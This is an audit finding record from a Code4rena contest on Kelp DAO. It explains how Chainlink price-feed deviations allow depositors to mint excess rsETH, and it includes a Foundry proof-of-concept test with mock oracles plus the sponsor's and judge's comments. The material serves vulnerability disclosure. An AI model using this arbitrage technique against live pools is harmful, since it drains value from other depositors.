---
# Core Classification
protocol: Kelp DAO
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 29050
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-11-kelp
source_link: https://code4rena.com/reports/2023-11-kelp
github_link: https://github.com/code-423n4/2023-11-kelp-findings/issues/584

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 15
finders:
  - 0xDING99YA
  - d3e4
  - PENGUN
  - Aamir
  - jayfromthe13th
---

## Vulnerability Title

[H-01] Possible arbitrage from Chainlink price discrepancy

### Overview


KelpDAO is a staking protocol that relies on Chainlink price feeds to calculate the rsETH/ETH exchange rate. The price feed has an acceptable deviation of [-2% 2%], meaning that the nodes will not update an on-chain price if the boundaries are not reached within the 24 hour period. This creates an arbitrage opportunity to exploit, as the deviations are significant enough to open up a small [+1%; +1.5%] arbitrage opportunity. 

An example of a profitable arbitrage is given in the original submission, and a proof of concept is provided to reproduce the case. The proof of concept involves slightly changing the LRTOracleMock, setUp(), and test_DepositAsset() functions. 

The arbitrage opportunity has been disputed and commented on by Kelp, who see it as a feature rather than a bug as the past two years of data shows that the price discrepancy is minor and won't impact deposits or withdrawals significantly. Judge 0xDjango commented that when Kelp implements the withdrawal mechanism, they will have a better understanding of the profitability of such an attack. 

At the moment, no mitigation steps have been proposed, but the discussion is open for further discussion.

### Original Finding Content


### Some theory needed

*   Currently KelpDAO relies on the following chainlink price feeds in order to calculate rsETH/ETH exchange rate:

|       | **Price Feed** | **Deviation** | **Heartbeat** |
| ----- | :------------: | :-----------: | :-----------: |
| **1** |    rETH/ETH    |       2%      |     86400s    |
| **2** |    cbETH/ETH   |       1%      |     86400s    |
| **3** |    stETH/ETH   |      0.5%     |     86400s    |

*   As we can see, an acceptable deviation for rETH/ETH price feed is about `[-2% 2%]`, meaning that the nodes will not update an on-chain price, in case the boundaries are not reached within the 24h period. These deviations are significant enough to open an arbitrage opportunities which will impact an overall rsETH/ETH exchange rate badly.

*   For a further analysis we have to look at the current LSD market distribution, which is represented here:

|       |   **LSD**   | **Staked ETH** | **Market Share** | **LRTDepositPool ratio** |
| ----- | :---------: | :------------: | :--------------: | ------------------------ |
| **1** |     Lido    |      8.95m     |      ~77.35%     | ~88.17%                  |
| **2** | Rocket Pool |      1.01m     |      ~8.76%      | ~9.95%                   |
| **3** |   Coinbase  |     190.549    |      ~1.65%      | ~1.88%                   |

*   Where `LRTDepositPool ratio` is an approximate ratio of deposited lsts based on the overall LSD market.

### An example of profitable arbitrage

See [original submission](https://github.com/code-423n4/2023-11-kelp-findings/issues/584) for full details.

### Final words

Basically, price feeds don't have to reach those extreme boundaries in order to profit from it. In theory presented above we were able to get +2.3% profit, which is significant in case there is a huge liquidity supplied. The combination of deviations might be absolutely random, since it operates in set of rational numbers. But it will constantly open a small \[+1%; +1.5%] arbitrage opportunities to be exploited.

### Proof on Concept

<details>

*   To reproduce the case described above, slightly change:
    *   `LRTOracleMock`:
        *   ```Solidity
            contract LRTOracleMock {
              uint256 public price;


              constructor(uint256 _price) {
                  price = _price;
              }

              function getAssetPrice(address) external view returns (uint256) {
                  return price;
              }

              function submitNewAssetPrice(uint256 _newPrice) external {
                  price = _newPrice;
              }
            }
            ```
    *   `setUp()`:
        *   ```Solidity
            contract LRTDepositPoolTest is BaseTest, RSETHTest {
            LRTDepositPool public lrtDepositPool;

              function setUp() public virtual override(RSETHTest, BaseTest) {
                  super.setUp();

                  // deploy LRTDepositPool
                  ProxyAdmin proxyAdmin = new ProxyAdmin();
                  LRTDepositPool contractImpl = new LRTDepositPool();
                  TransparentUpgradeableProxy contractProxy = new TransparentUpgradeableProxy(
                      address(contractImpl),
                      address(proxyAdmin),
                      ""
                  );
                  
                  lrtDepositPool = LRTDepositPool(address(contractProxy));

                  // initialize RSETH. LRTCOnfig is already initialized in RSETHTest
                  rseth.initialize(address(admin), address(lrtConfig));
                  vm.startPrank(admin);
                  // add rsETH to LRT config
                  lrtConfig.setRSETH(address(rseth));
                  // add oracle to LRT config
                  lrtConfig.setContract(LRTConstants.LRT_ORACLE, address(new LRTOracle()));
                  lrtConfig.setContract(LRTConstants.LRT_DEPOSIT_POOL, address(lrtDepositPool));
                  LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).initialize(address(lrtConfig));


                  lrtDepositPool.initialize(address(lrtConfig));
                  // add minter role for rseth to lrtDepositPool
                  rseth.grantRole(rseth.MINTER_ROLE(), address(lrtDepositPool));

              }
            }
            ```
    *   `test_DepositAsset()`:
        *   ```Solidity
                function test_DepositAsset() external {
                  address rETHPriceOracle = address(new LRTOracleMock(1.09149e18));
                  address stETHPriceOracle = address(new LRTOracleMock(0.99891e18));
                  address cbETHPriceOracle = address(new LRTOracleMock(1.05407e18));
                  LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(rETH), rETHPriceOracle);
                  LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(stETH), stETHPriceOracle);
                  LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(cbETH), cbETHPriceOracle);

                  console.log("rETH/ETH exchange rate after", LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0)));
                  console.log("stETH/ETH exchange rate after", LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0)));
                  console.log("cbETH/ETH exchange rate after", LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0)));

                  vm.startPrank(alice); // alice provides huge amount of liquidity to the pool

                  rETH.approve(address(lrtDepositPool), 9950 ether);
                  lrtDepositPool.depositAsset(rETHAddress, 9950 ether);

                  stETH.approve(address(lrtDepositPool), 88170 ether);
                  lrtDepositPool.depositAsset(address(stETH), 88170 ether);

                  cbETH.approve(address(lrtDepositPool), 1880 ether);
                  lrtDepositPool.depositAsset(address(cbETH), 1880 ether);

                  vm.stopPrank();


                  vm.startPrank(carol); // carol deposits, when the price feeds return answer pretty close to a spot price

                  uint256 carolBalanceBefore = rseth.balanceOf(address(carol));

                  rETH.approve(address(lrtDepositPool), 100 ether);
                  lrtDepositPool.depositAsset(address(rETH), 100 ether);

                  uint256 carolBalanceAfter = rseth.balanceOf(address(carol));

                  vm.stopPrank();

                  uint256 rETHNewPrice = uint256(LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0))) * 102 / 100; // +2%
                  uint256 stETHNewPrice = uint256(LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0))) * 995 / 1000; // -0.5%
                  uint256 cbETHNewPrice = uint256(LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0))) * 99 / 100; // -1%

                  LRTOracleMock(rETHPriceOracle).submitNewAssetPrice(rETHNewPrice);
                  LRTOracleMock(stETHPriceOracle).submitNewAssetPrice(stETHNewPrice);
                  LRTOracleMock(cbETHPriceOracle).submitNewAssetPrice(cbETHNewPrice);

                  console.log("rETH/ETH exchange rate after", LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0)));
                  console.log("stETH/ETH exchange rate after", LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0)));
                  console.log("cbETH/ETH exchange rate after", LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0)));

                  vm.startPrank(bob);

                  // bob balance of rsETH before deposit
                  uint256 bobBalanceBefore = rseth.balanceOf(address(bob));

                  rETH.approve(address(lrtDepositPool), 100 ether);
                  lrtDepositPool.depositAsset(address(rETH), 100 ether);

                  uint256 bobBalanceAfter = rseth.balanceOf(address(bob));
                  vm.stopPrank();

                  assertEq(bobBalanceBefore, carolBalanceBefore, "the balances are not the same");
                  assertGt(bobBalanceAfter, carolBalanceAfter * 102 / 100, "some random shit happened");
                  assertLt(bobBalanceAfter, carolBalanceAfter * 103 / 100, "some random shittttt happened");

                }
            ```

</details>

### Recommended Mitigation Steps

**Short term:**

*   N/A

**Long term:**

*   I was thinking about utilizing multiple price oracles, which could potentially close any profitable opportunities, but the gas overhead and overall complexity grows rapidly. Unfortunately, I don't have anything robust to offer by now, but open to discuss about it.

### Assessed type

Math

**[gus (Kelp) disputed and commented](https://github.com/code-423n4/2023-11-kelp-findings/issues/584#issuecomment-1825309294):**
 > We appreciate the explanation at length you have here. We see the arbitrage as a feature rather than a bug in the system. The past 2 year data on the price discrepancy assures us that this is a minor vector that will not impact deposits or withdraws significantly. Moreover, the fact that minters earn nominally more and withdrawals earn nominally less balances the system. We also want to call out that price arbitrage is not a unique problem to our design. It is virtually present across every staking protocol and we encourage healthy arbitrage opportunity here.

**[0xDjango (judge) commented](https://github.com/code-423n4/2023-11-kelp-findings/issues/584#issuecomment-1847574552):**
 > This is valid. Depositors will be able to deposit the minimally-priced asset and steal value from the deposit pool. The deviation % and heartbeat are too large and this will open up arbitrage opportunities to the detriment of Kelp's users. When Kelp implements the withdrawal mechanism, we will have a better understanding of the profitability of such an attack. For example, if Kelp implements withdrawals without a staking delay, given the large amount of on-chain liquidity of the underlying assets, the pool may be able to be exploited for large amounts given even a 1% price discrepancy between the different LSTs.

*Note: see [original submission](https://github.com/code-423n4/2023-11-kelp-findings/issues/584) for full discussion.*



***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Kelp DAO |
| Report Date | N/A |
| Finders | 0xDING99YA, d3e4, PENGUN, Aamir, jayfromthe13th, deth, HChang26, SBSecurity, circlelooper, Bauchibred, almurhasan, anarcheuz, CatsSecurity, adriro, m\_Rassska |

### Source Links

- **Source**: https://code4rena.com/reports/2023-11-kelp
- **GitHub**: https://github.com/code-423n4/2023-11-kelp-findings/issues/584
- **Contest**: https://code4rena.com/reports/2023-11-kelp

### Keywords for Search

`vulnerability`

